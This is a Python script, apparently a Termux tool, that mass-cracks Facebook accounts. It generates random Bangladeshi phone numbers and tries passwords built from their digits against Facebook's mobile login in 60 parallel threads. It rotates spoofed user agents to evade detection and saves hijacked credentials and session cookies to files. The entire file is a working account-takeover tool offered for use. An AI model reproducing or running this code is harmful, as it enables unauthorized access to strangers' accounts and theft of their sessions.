#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os,time,random,string,re,sys,requests,json,uuid
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
from concurrent.futures import ThreadPoolExecutor as ThreadPool
####$#######
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
#########
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Tizen'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SAMSUNG SM-R835F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#######$$
dt="•"
#########
ok=[]
cp=[]
lop=0
xode=[]
version="1.04"
def line():
	print("────────────────────────────────────────")
def logo():
	os.system('clear');print(f"""\x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m █████  \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██████    \x1b[1;94m
\x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██  \x1b[1;94m
\x1b[1;92m  █████   \033[1;33m███████ \x1b[1;91m███████ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██   \x1b[1;94m
\x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m ██ \x1b[1;95m██   ██  \x1b[1;94m
\x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m███████ \x1b[1;96m██ \x1b[1;95m██████   \x1b[1;94m
\33[1;92m┏═══════════════════════════════┳═══════════╗
║ DEVOLPER : KHALID SHAIFULLAH  ║VERSION-1.5║
║ FACEBOOK : KHALID SHAIFULLAH  ║═══════════║
║ GITHUB   : KHALID-404         ║  RANDOM   ║
║ WHATSAPP : +8801798396843     ║BANGLADESH ║
┗═══════════════════════════════┻═══════════╝""")
def Main():
	logo()
	print(f'{W}[{G}1{W}]{W} CRACKING START');print(f'{W}[{G}2{W}]{W} CONTACT ADMIN');print(f'{W}[{G}3{W}]{W} FACEBOOK GROUP');print(f'{W}[{G}E{W}]{W} EXIT')
	line()
	gh=input(f'[{G}+{W}] Choice : ')
	if gh in ["1"]:
		kkkkk()
	elif gh in ["2"]:
		os.system('am start https://wa.me/+8801798-396843');time.sleep(5);Main()
	elif gh in ['3']:
		os.system('xdg-open https://m.facebook.com/groups/termux.working.commands/?ref=share&mibextid=jf9HGS/');time.sleep(5);Main()
	elif gh in ["e","E"]:
		os.system("cd..")
	else:
		line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
############random
def kkkkk():
	logo()
	print(f"{W} BD SIM CODE : {G}017 015 018 019 013 016{E}{W}");line()
	code=input(f' {W}[{G}+{E}] Choice : {G}');print(f"{W}────────────────────────────────────────")
	print(f'{W} EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f' [{G}+{E}] Limit : {G}'))
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f'{W}[{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f'{W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f'{W}[{G}•{W}] \033[1;37mAEROPLANE MODE [{G}ON{W}/{R}OF{W}] IN EVERY 5MIN ');print("────────────────────────────────────────")
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			tonxoys.submit(nrmlrm,id,psd,tid)
##########random method
def nrmlrm(id,psd,tid):
	global ok,cp,lop
	session = requests.Session()
	ua=random.choice(ugen)
	for psw in psd:
		sys.stdout.write(f'\r\r{W}[{G}CRACKING{W}]{E} {W}[{G}{lop}{W}/{G}{tid}{W}]{E} {W}[{W}OK{W}:{G}%s{W}]{E}'%(len(ok)));sys.stdout.flush()
		ffb = session.get(f'https://m.facebook.com').text
		datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
		header={'authority': 'm.facebook.com','method': 'GET','path': '/','scheme': 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"','sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
		lo = session.post(f'https://m.facebook.com/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
		lcki=session.cookies.get_dict().keys()
		if 'c_user' in lcki:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			iid = coki[151:166]
			print(f'\r\r{R}[{G}LIVE{R}] {G}{iid} | {psw}{W}')
			#print(f'\r\r{R}[{G}COKI{R}]{W}: {G}{coki}{E}')
			ok.append(id)
			open('/sdcard/LIVE.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			iid = coki[141:156]
			#print(f'\r\r{G}[{R}CKPT{G}] {R}{iid} | {psw}{W}')
			cp.append(id)
			open('/sdcard/DEACTIVE.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()